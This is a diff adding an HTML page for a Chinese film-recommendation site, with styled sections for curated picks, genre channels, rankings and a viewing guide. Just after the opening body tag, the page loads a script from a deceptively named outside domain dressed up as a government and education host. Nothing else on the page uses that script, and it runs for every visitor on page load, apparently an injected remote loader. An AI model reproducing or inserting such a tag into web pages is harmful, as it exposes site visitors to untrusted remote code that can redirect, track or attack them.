@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>青苹果电影网：清新影视指南，发现每一部值得看的青春与剧情佳作</title>
+<meta name="description" content="青苹果电影网以清新视角解读影视作品，提供青春爱情、剧情文艺、独立佳片与经典回顾的选片指南、看点解析和口碑榜单，帮你在繁杂片单里找到那一抹清爽好味道。">
+<meta name="keywords" content="青苹果电影网,清新电影推荐,青春爱情片,文艺剧情片,独立电影,影视看点解析">
+<meta name="robots" content="index,follow">
+<meta name="revisit-after" content="3 days">
+<meta name="language" content="zh-CN">
+<meta name="author" content="青苹果电影网">
+<link rel="canonical" href="https://qingpingguodianyingwang-zh.github.io/">
+<style>
+:root{
+  --apple:#5fb878;
+  --leaf:#3f9b5c;
+  --deep:#12381f;
+  --cream:#f4faf5;
+  --milk:#fbfefb;
+  --ink:#22332a;
+  --muted:#6f7d75;
+  --line:#dfece2;
+  --amber:#e6a93c;
+  --soft:#e8f5ec;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--milk);color:var(--ink);
+  font-family:"Noto Sans SC","PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  line-height:1.85;-webkit-font-smoothing:antialiased;
+}
+body::after{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;
+  background:radial-gradient(circle at 12% 8%,rgba(95,184,120,.08),transparent 42%),radial-gradient(circle at 88% 92%,rgba(63,155,92,.06),transparent 40%)}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 24px}
+
+/* 顶栏 */
+header{position:sticky;top:0;z-index:99;background:rgba(251,254,251,.92);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.h-in{display:flex;align-items:center;justify-content:space-between;height:70px;gap:24px}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .badge{width:40px;height:40px;border-radius:50%;background:var(--leaf);color:#fff;display:grid;place-items:center;font-size:19px;font-weight:900;box-shadow:0 4px 10px rgba(63,155,92,.35)}
+.logo b{font-size:20px;letter-spacing:.5px}
+.logo b i{font-style:normal;color:var(--leaf)}
+.logo small{display:block;font-size:10px;letter-spacing:3px;color:var(--muted);text-transform:uppercase}
+.menu{display:flex;gap:6px;align-items:center}
+.menu a{padding:8px 14px;font-size:14px;font-weight:600;border-radius:20px;transition:.2s}
+.menu a:hover{background:var(--soft);color:var(--leaf)}
+.btn-pill{padding:9px 22px!important;background:var(--leaf);color:#fff!important;border-radius:20px}
+.btn-pill:hover{background:var(--deep)}
+.burg{display:none;width:42px;height:42px;border:1.5px solid var(--leaf);border-radius:50%;background:none;cursor:pointer;position:relative}
+.burg span{position:absolute;left:11px;right:11px;height:2px;background:var(--leaf);border-radius:2px}
+.burg span:nth-child(1){top:14px}.burg span:nth-child(2){top:20px}.burg span:nth-child(3){top:26px}
+
+/* 首屏 */
+.hero{padding:60px 0 50px;position:relative;overflow:hidden}
+.hero .grid{display:grid;grid-template-columns:1fr 460px;gap:56px;align-items:center}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;background:var(--soft);color:var(--leaf);font-size:12px;font-weight:700;padding:6px 16px;border-radius:20px;letter-spacing:1px}
+.hero h1{font-size:54px;line-height:1.16;font-weight:900;margin:22px 0 18px;letter-spacing:-1.5px}
+.hero h1 em{font-style:normal;position:relative;color:var(--leaf)}
+.hero h1 em::after{content:"";position:absolute;left:0;right:0;bottom:4px;height:12px;background:rgba(95,184,120,.28);z-index:-1}
+.hero .lead{font-size:16px;color:var(--muted);max-width:520px}
+.stats{display:flex;gap:36px;margin-top:32px;flex-wrap:wrap}
+.stats div span{display:block;font-size:30px;font-weight:900;color:var(--leaf);line-height:1.2}
+.stats div small{font-size:12px;color:var(--muted)}
+.cta{margin-top:34px;display:flex;gap:14px;flex-wrap:wrap}
+.cta a{display:inline-flex;align-items:center;gap:8px;padding:14px 30px;border-radius:30px;font-size:15px;font-weight:700;transition:.25s}
+.cta .a{background:var(--leaf);color:#fff}.cta .a:hover{background:var(--deep);transform:translateY(-2px)}
+.cta .b{border:1.5px solid var(--line);color:var(--ink)}.cta .b:hover{border-color:var(--leaf);color:var(--leaf)}
+
+.fruit{position:relative;background:var(--soft);border-radius:28px;padding:34px;border:1px solid var(--line)}
+.fruit .ring{position:absolute;width:180px;height:180px;border:1.5px dashed var(--apple);border-radius:50%;opacity:.4}
+.fruit .r1{right:-40px;top:-40px}.fruit .r2{left:-30px;bottom:-30px;width:130px;height:130px}
+.fruit h4{font-size:12px;letter-spacing:3px;color:var(--leaf);margin-bottom:20px}
+.pick{display:flex;gap:14px;align-items:flex-start;padding:14px 0;border-bottom:1px solid var(--line)}
+.pick:last-child{border-bottom:none}
+.pick .dot{width:10px;height:10px;border-radius:50%;background:var(--apple);margin-top:9px;flex-shrink:0}
+.pick b{display:block;font-size:15px}
+.pick p{font-size:13px;color:var(--muted)}
+
+/* 通用区块 */
+section{padding:64px 0}
+.sec-h{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:34px;flex-wrap:wrap}
+.sec-h .l h2{font-size:28px;font-weight:900;letter-spacing:-.5px}
+.sec-h .l h2 i{font-style:normal;color:var(--leaf)}
+.sec-h .l p{font-size:13px;color:var(--muted);margin-top:6px;max-width:420px}
+.sec-h .r{font-size:13px;font-weight:700;color:var(--leaf);white-space:nowrap}
+
+/* 频道标签 */
+.tabs{display:flex;gap:10px;margin-bottom:26px;flex-wrap:wrap}
+.tabs a{padding:8px 20px;border-radius:30px;border:1px solid var(--line);font-size:14px;font-weight:600;transition:.2s}
+.tabs a.on{background:var(--deep);border-color:var(--deep);color:#fff}
+.tabs a:hover{border-color:var(--leaf);color:var(--leaf)}
+.gallery{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.item{position:relative;border-radius:18px;overflow:hidden;aspect-ratio:3/4;background:#ddd}
+.item img{width:100%;height:100%;object-fit:cover;transition:.6s}
+.item:hover img{transform:scale(1.08)}
+.item .cap{position:absolute;inset:auto 0 0;padding:26px 18px 18px;color:#fff;background:linear-gradient(0deg,rgba(18,56,31,.95),transparent)}
+.item .cap b{font-size:17px;display:block}
+.item .cap span{font-size:12px;opacity:.9}
+.item .badge-t{position:absolute;top:14px;left:14px;background:var(--amber);color:#fff;font-size:11px;font-weight:800;padding:4px 12px;border-radius:20px}
+.item .badge-n{position:absolute;top:14px;right:14px;background:rgba(255,255,255,.9);color:var(--deep);font-size:12px;font-weight:800;width:30px;height:30px;border-radius:50%;display:grid;place-items:center}
+
+/* 分类九宫格 */
+.grid9{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.g9{background:var(--milk);border:1px solid var(--line);border-radius:16px;padding:26px 22px;transition:.3s;position:relative;overflow:hidden}
+.g9:hover{background:var(--leaf);color:#fff;border-color:var(--leaf);transform:translateY(-4px)}
+.g9:hover p,.g9:hover small{color:rgba(255,255,255,.85)}
+.g9 .ico{font-size:26px;margin-bottom:10px;display:block}
+.g9 b{font-size:17px;display:block}
+.g9 p{font-size:13px;color:var(--muted);margin:8px 0 12px}
+.g9 small{font-size:11px;font-weight:700;letter-spacing:1px;color:var(--leaf)}
+
+/* 榜单双栏 */
+.rank{display:grid;grid-template-columns:1fr 1fr;gap:30px}
+.rk-box{background:var(--soft);border:1px solid var(--line);border-radius:20px;padding:28px}
+.rk-box h3{font-size:18px;margin-bottom:18px;display:flex;align-items:center;gap:10px}
+.rk-box h3::before{content:"";width:6px;height:22px;background:var(--leaf);border-radius:3px}
+.rk{display:flex;gap:14px;align-items:center;padding:12px 0;border-bottom:1px dashed var(--line)}
+.rk:last-child{border-bottom:none}
+.rk .n{font-family:Georgia,serif;font-size:22px;font-weight:900;color:var(--apple);width:34px}
+.rk:nth-child(1) .n,.rk:nth-child(2) .n,.rk:nth-child(3) .n{color:var(--amber)}
+.rk .tx{flex:1}
+.rk .tx b{font-size:15px;display:block}
+.rk .tx small{font-size:12px;color:var(--muted)}
+.rk .sc{font-size:13px;font-weight:800;color:var(--leaf)}
+
+/* 时间线 */
+.tl{position:relative;padding-left:40px}
+.tl::before{content:"";position:absolute;left:11px;top:6px;bottom:6px;width:2px;background:var(--line)}
+.step{position:relative;padding-bottom:26px}
+.step::before{content:"";position:absolute;left:-34px;top:6px;width:16px;height:16px;border-radius:50%;background:var(--apple);border:3px solid var(--milk)}
+.step .d{font-size:12px;font-weight:800;letter-spacing:1px;color:var(--leaf)}
+.step h4{font-size:17px;margin:4px 0 6px}
+.step p{font-size:14px;color:var(--muted)}
+
+/* 关于 */
+.about{background:var(--deep);color:var(--milk);border-radius:28px;padding:48px;display:grid;grid-template-columns:1fr 1fr;gap:48px;align-items:center;position:relative;overflow:hidden}
+.about::after{content:"";position:absolute;right:-60px;bottom:-60px;width:240px;height:240px;border:1.5px dashed rgba(255,255,255,.14);border-radius:50%}
+.about h2{font-size:32px;font-weight:900;line-height:1.35;margin-bottom:16px}
+.about h2 em{font-style:normal;color:var(--apple)}
+.about p{color:#c3d3c8;font-size:15px;margin-bottom:14px}
+.chips{display:flex;gap:10px;flex-wrap:wrap;margin-top:24px}
+.chips span{padding:7px 16px;border-radius:20px;background:rgba(255,255,255,.1);font-size:13px}
+.links{background:rgba(255,255,255,.06);border-radius:20px;padding:28px;border:1px solid rgba(255,255,255,.1)}
+.links .lb{font-size:11px;letter-spacing:3px;color:var(--apple);margin-bottom:14px}
+.links .url{font-family:ui-monospace,Menlo,monospace;font-size:14px;background:rgba(0,0,0,.25);padding:14px 16px;border-radius:12px;word-break:break-all;color:#d8f0de}
+.links ul{list-style:none;margin-top:20px;display:grid;gap:10px}
+.links li{font-size:13px;color:#c3d3c8;display:flex;gap:10px}
+.links li::before{content:"✓";color:var(--apple);font-weight:900}
+
+/* 页脚 */
+footer{background:var(--deep);color:var(--milk);padding:52px 0 24px;margin-top:40px}
+.f-in{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:36px}
+.f-in h4{font-size:13px;letter-spacing:2px;color:var(--apple);margin-bottom:16px}
+.f-in ul{list-style:none;display:flex;flex-direction:column;gap:10px}
+.f-in a{font-size:13px;color:#b8c9be}
+.f-in a:hover{color:#fff}
+.brand2{display:flex;align-items:center;gap:12px}
+.brand2 .badge{width:44px;height:44px;border-radius:50%;background:var(--leaf);color:#fff;display:grid;place-items:center;font-size:20px;font-weight:900}
+.brand2 b{font-size:19px}.brand2 b i{font-style:normal;color:var(--apple)}
+.brand2 p{margin-top:12px;font-size:13px;color:#9db0a2;max-width:320px}
+.copy{margin-top:34px;padding-top:20px;border-top:1px solid rgba(255,255,255,.12);display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-size:12px;color:#7f9487}
+.copy a{color:#7f9487}
+
+@media(max-width:980px){
+  .hero .grid,.about{grid-template-columns:1fr;gap:40px}
+  .hero h1{font-size:42px}
+  .gallery,.grid9{grid-template-columns:repeat(3,1fr)}
+  .rank{grid-template-columns:1fr}
+  .f-in{grid-template-columns:1fr 1fr}
+}
+@media(max-width:640px){
+  .menu{display:none;position:absolute;top:70px;left:0;right:0;flex-direction:column;padding:16px;background:var(--milk);border-bottom:1px solid var(--line)}
+  .menu.open{display:flex}
+  .menu a{width:100%;text-align:center;padding:12px}
+  .burg{display:block}
+  .hero{padding:36px 0 30px}.hero h1{font-size:32px}
+  .gallery,.grid9{grid-template-columns:repeat(2,1fr)}
+  .sec-h .l h2{font-size:23px}
+  section{padding:44px 0}
+  .about{padding:30px;border-radius:20px}
+  .f-in{grid-template-columns:1fr}
+  .copy{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+  <div class="wrap h-in">
+    <div class="logo">
+      <div class="badge">青</div>
+      <div><b>青苹果<i>电影网</i></b><small>FRESH · CINEMA GUIDE</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#pick">青选片单</a>
+      <a href="#type">类型频道</a>
+      <a href="#rank">口碑榜单</a>
+      <a href="#guide">观影指南</a>
+      <a href="#about">关于我们</a>
+      <a class="btn-pill" href="#">登录 / 收藏</a>
+    </nav>
+    <button class="burg" id="burg" aria-label="菜单"><span></span><span></span><span></span></button>
+  </div>
+</header>
+
+<!-- 首屏 -->
+<section class="hero" id="home">
+  <div class="wrap grid">
+    <div>
+      <span class="eyebrow">◆ 清新影视指南 · 2026</span>
+      <h1>像咬一口 <em>青苹果</em><br>好电影，清爽入心</h1>
+      <p class="lead">青苹果电影网专注挑选那些被忽略却值得一看的清新佳作——青春、爱情、文艺与独立电影，用真实看点帮你避开烂片，留住好时光。</p>
+      <div class="stats">
+        <div><span>1,280+</span><small>精选影片</small></div>
+        <div><span>96%</span><small>片单好评率</small></div>
+        <div><span>12</span><small>影片类型频道</small></div>
+      </div>
+      <div class="cta">
+        <a class="a" href="#pick">看看今日青选 →</a>
+        <a class="b" href="#rank">口碑榜单</a>
+      </div>
+    </div>
+    <div class="fruit">
+      <div class="ring r1"></div><div class="ring r2"></div>
+      <h4>◆ TODAY'S PICK · 今日青选</h4>
+      <div class="pick"><span class="dot"></span><div><b>十七岁的风</b><p>青春成长 / 一场关于离别与勇气的夏日约定</p></div></div>
+      <div class="pick"><span class="dot"></span><div><b>橘子汽水</b><p>爱情喜剧 / 甜而不腻的便利店邂逅</p></div></div>
+      <div class="pick"><span class="dot"></span><div><b>南方来信</b><p>文艺剧情 / 一封跨越二十年的家书</p></div></div>
+      <div class="pick"><span class="dot"></span><div><b>城市边缘的猫</b><p>治愈 / 一个人与一只流浪猫的冬天</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 青选片单 -->
+<section id="pick">
+  <div class="wrap">
+    <div class="sec-h">
+      <div class="l"><h2><i>青选片单</i> · 编辑精选</h2><p>每一部都经过真实观看与筛选，从看点、氛围到适合的心情，给你一份可信赖的观影参考。</p></div>
+      <a class="r" href="#">浏览完整片单 →</a>
+    </div>
+    <div class="tabs">
+      <a class="on" href="#">本周推荐</a><a href="#">青春爱情</a><a href="#">文艺剧情</a><a href="#">独立佳作</a><a href="#">经典回顾</a><a href="#">治愈短片</a>
+    </div>
+    <div class="gallery">
+      <a class="item" href="#"><img src="https://images.unsplash.com/photo-1485095329183-d0797cdc5676?auto=format&fit=crop&w=520&q=70" alt=""><span class="badge-t">本周青选</span><span class="badge-n">1</span><div class="cap"><b>十七岁的风</b><span>青春 · 成长 · 8.8</span></div></a>
+      <a class="item" href="#"><img src="https://images.unsplash.com/photo-1502139214982-d0ad755818d8?auto=format&fit=crop&w=520&q=70" alt=""><span class="badge-t">口碑高</span><span class="badge-n">2</span><div class="cap"><b>南方来信</b><span>文艺 · 剧情 · 8.6</span></div></a>
+      <a class="item" href="#"><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?auto=format&fit=crop&w=520&q=70" alt=""><span class="badge-t">新片</span><span class="badge-n">3</span><div class="cap"><b>橘子汽水</b><span>爱情 · 喜剧 · 8.1</span></div></a>
+      <a class="item" href="#"><img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?auto=format&fit=crop&w=520&q=70" alt=""><span class="badge-t">冷门佳</span><span class="badge-n">4</span><div class="cap"><b>城市边缘的猫</b><span>治愈 · 生活 · 8.5</span></div></a>
+      <a class="item" href="#"><img src="https://images.unsplash.com/photo-1518929458119-e5bf444c30f4?auto=format&fit=crop&w=520&q=70" alt=""><span class="badge-t">高分</span><span class="badge-n">5</span><div class="cap"><b>海边的旧书店</b><span>剧情 · 人文 · 8.7</span></div></a>
+      <a class="item" href="#"><img src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=520&q=70" alt=""><span class="badge-t">纪录</span><span class="badge-n">6</span><div class="cap"><b>山那边的人家</b><span>纪录 · 人文 · 8.4</span></div></a>
+      <a class="item" href="#"><img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?auto=format&fit=crop&w=520&q=70" alt=""><span class="badge-t">亲子</span><span class="badge-n">7</span><div class="cap"><b>小鹿与雨</b><span>动画 · 家庭 · 8.3</span></div></a>
+      <a class="item" href="#"><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?auto=format&fit=crop&w=520&q=70" alt=""><span class="badge-t">犯罪</span><span class="badge-n">8</span><div class="cap"><b>白夜出租车</b><span>犯罪 · 悬疑 · 8.2</span></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- 类型频道 -->
+<section id="type" style="background:var(--cream)">
+  <div class="wrap">
+    <div class="sec-h">
+      <div class="l"><h2><i>类型频道</i> · 按心情找片</h2><p>开心、难过、想放空还是想被触动？从心情出发，匹配当下最适合看的那一类电影。</p></div>
+      <a class="r" href="#">全部频道 →</a>
+    </div>
+    <div class="grid9">
+      <a class="g9" href="#"><span class="ico">🌸</span><b>青春校园</b><p>校服、单车与来不及说出口的告白，最适合重温悸动的年纪。</p><small>YOUTH</small></a>
+      <a class="g9" href="#"><span class="ico">💌</span><b>爱情喜剧</b><p>轻松甜蜜的恋爱故事，一个人看也不会觉得孤单。</p><small>ROM-COM</small></a>
+      <a class="g9" href="#"><span class="ico">🎨</span><b>文艺剧情</b><p>节奏舒缓、影像讲究，值得细细品味人物与情绪的流动。</p><small>ART-HOUSE</small></a>
+      <a class="g9" href="#"><span class="ico">🌿</span><b>治愈生活</b><p>猫、咖啡、小镇与四季，给疲惫的日常充一口气的影片。</p><small>HEALING</small></a>
+      <a class="g9" href="#"><span class="ico">🎬</span><b>独立佳作</b><p>小成本、大表达，往往藏着最真诚的创作初心。</p><small>INDIE</small></a>
+      <a class="g9" href="#"><span class="ico">🐳</span><b>动画奇幻</b><p>手绘质感与想象力交织，大人小孩都能被治愈的作品。</p><small>ANIMATION</small></a>
+      <a class="g9" href="#"><span class="ico">📷</span><b>纪录真实</b><p>用真实影像记录世界，看完会想重新认识身边的一切。</p><small>DOCUMENTARY</small></a>
+      <a class="g9" href="#"><span class="ico">🎞️</span><b>经典回顾</b><p>经得起时间检验的老片，每次重看都有新的体会。</p><small>CLASSIC</small></a>
+    </div>
+  </div>
+</section>
+
+<!-- 口碑榜单 -->
+<section id="rank">
+  <div class="wrap">
+    <div class="sec-h">
+      <div class="l"><h2><i>口碑榜单</i> · 观众票选</h2><p>综合观众评分与编辑意见整理的两份榜单，一份看新鲜热度，一份看时间沉淀。</p></div>
+      <a class="r" href="#">查看全部榜单 →</a>
+    </div>
+    <div class="rank">
+      <div class="rk-box">
+        <h3>本周人气榜</h3>
+        <div class="rk"><span class="n">1</span><div class="tx"><b>十七岁的风</b><small>青春 / 成长</small></div><span class="sc">8.8</span></div>
+        <div class="rk"><span class="n">2</span><div class="tx"><b>海边的旧书店</b><small>剧情 / 人文</small></div><span class="sc">8.7</span></div>
+        <div class="rk"><span class="n">3</span><div class="tx"><b>南方来信</b><small>文艺 / 剧情</small></div><span class="sc">8.6</span></div>
+        <div class="rk"><span class="n">4</span><div class="tx"><b>橘子汽水</b><small>爱情 / 喜剧</small></div><span class="sc">8.1</span></div>
+        <div class="rk"><span class="n">5</span><div class="tx"><b>白夜出租车</b><small>犯罪 / 悬疑</small></div><span class="sc">8.2</span></div>
+      </div>
+      <div class="rk-box">
+        <h3>经典常青榜</h3>
+        <div class="rk"><span class="n">1</span><div class="tx"><b>情书</b><small>爱情 / 文艺</small></div><span class="sc">9.1</span></div>
+        <div class="rk"><span class="n">2</span><div class="tx"><b>天堂电影院</b><small>剧情 / 怀旧</small></div><span class="sc">9.3</span></div>
+        <div class="rk"><span class="n">3</span><div class="tx"><b>千与千寻</b><small>动画 / 奇幻</small></div><span class="sc">9.4</span></div>
+        <div class="rk"><span class="n">4</span><div class="tx"><b>阿甘正传</b><small>剧情 / 励志</small></div><span class="sc">9.2</span></div>
+        <div class="rk"><span class="n">5</span><div class="tx"><b>海上钢琴师</b><small>文艺 / 音乐</small></div><span class="sc">9.3</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 观影指南 -->
+<section id="guide" style="background:var(--cream)">
+  <div class="wrap">
+    <div class="sec-h">
+      <div class="l"><h2><i>观影指南</i> · 把时间花在好片上</h2><p>从怎么挑片到看懂一部电影，我们整理了一份简单实用的看片方法，新手也能快速上手。</p></div>
+      <a class="r" href="#">更多指南 →</a>
+    </div>
+    <div class="rank">
+      <div class="rk-box">
+        <h3>新手选片四步</h3>
+        <div class="tl">
+          <div class="step"><div class="d">STEP 01</div><h4>先定心情，再定类型</h4><p>想放松就看喜剧治愈，想被触动就选文艺剧情，心情是选片的第一把钥匙。</p></div>
+          <div class="step"><div class="d">STEP 02</div><h4>看评分，更要看评论</h4><p>高分开场不等于适合你，看看评论里具体讲了什么，判断题材是否合口味。</p></div>
+          <div class="step"><div class="d">STEP 03</div><h4>试看前 10 分钟</h4><p>节奏、画面和台词风格很快就能感受出来，不合适及时换片不心疼。</p></div>
+          <div class="step"><div class="d">STEP 04</div><h4>看完留个标记</h4><p>随手记录看过的片子与短评，慢慢会形成属于你自己的片单口味。</p></div>
+        </div>
+      </div>
+      <div class="rk-box">
+        <h3>我们的选片标准</h3>
+        <div class="tl">
+          <div class="step"><div class="d">POINT 01</div><h4>故事是否真诚</h4><p>情节可以不复杂，但人物与情感要立得住，拒绝套路化的煽情与反转。</p></div>
+          <div class="step"><div class="d">POINT 02</div><h4>影像是否用心</h4><p>构图、光影与配乐是否服务于故事，而非单纯炫技或堆砌场面。</p></div>
+          <div class="step"><div class="d">POINT 03</div><h4>口碑是否稳定</h4><p>综合多平台评分与真实观众反馈，避免被单一方评价带偏。</p></div>
+          <div class="step"><div class="d">POINT 04</div><h4>是否值得回味</h4><p>看完愿意跟朋友聊两句、想再看一遍的片子，才是真正值得推荐的。</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于我们 -->
+<section id="about">
+  <div class="wrap">
+    <div class="about">
+      <div>
+        <h2>关于 <em>青苹果电影网</em></h2>
+        <p>青苹果电影网是一个小而专注的影视推荐站点，我们相信好电影不需要吵闹的宣传，只需要被合适的人遇见。</p>
+        <p>这里没有铺天盖地的片单，只有一份份认真挑选过的青选清单、类型频道与口碑榜单，陪你慢慢看、好好选。</p>
+        <div class="chips"><span>清新视角</span><span>人工精选</span><span>真实看点</span><span>拒绝烂片</span><span>常更常新</span></div>
+      </div>
+      <div class="links">
+        <div class="lb">◆ 站点信息 / SITE INFO</div>
+        <div class="url">https://qingpingguodianyingwang-zh.github.io/</div>
+        <ul>
+          <li>青选片单 · 编辑真实观看后推荐</li>
+          <li>类型频道 · 按心情与口味找片</li>
+          <li>口碑榜单 · 人气与经典双榜</li>
+          <li>观影指南 · 新手也能轻松上手</li>
+          <li>经典回顾 · 常看常新的老片</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="wrap">
+    <div class="f-in">
+      <div class="brand2">
+        <div class="badge">青</div>
+        <div><b>青苹果<i>电影网</i></b></div>
+        <p>专注清新影视推荐，用一份安静的片单，陪你发现更多值得一看的好电影。</p>
+      </div>
+      <div>
+        <h4>探索片单</h4>
+        <ul>
+          <li><a href="#pick">青选片单</a></li>
+          <li><a href="#type">类型频道</a></li>
+          <li><a href="#rank">口碑榜单</a></li>
+          <li><a href="#guide">观影指南</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>类型频道</h4>
+        <ul>
+          <li><a href="#">青春校园</a></li>
+          <li><a href="#">爱情喜剧</a></li>
+          <li><a href="#">文艺剧情</a></li>
+          <li><a href="#">治愈生活</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#about">关于青苹果电影网</a></li>
+          <li><a href="#">投稿与推荐</a></li>
+          <li><a href="#">隐私声明</a></li>
+          <li><a href="#">免责声明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© 2026 青苹果电影网 版权所有 · 网站网址：https://qingpingguodianyingwang-zh.github.io</span>
+      <span><a href="https://qingpingguodianyingwang-zh.github.io/">qingpingguodianyingwang-zh.github.io</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('burg').addEventListener('click',function(){
+  document.getElementById('menu').classList.toggle('open');
+});
+document.querySelectorAll('.menu a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('menu').classList.remove('open');});
+});
+document.querySelectorAll('.tabs a').forEach(function(a){
+  a.addEventListener('click',function(e){e.preventDefault();document.querySelectorAll('.tabs a').forEach(function(x){x.classList.remove('on');});a.classList.add('on');});
+});
+</script>
+</body>
+</html>
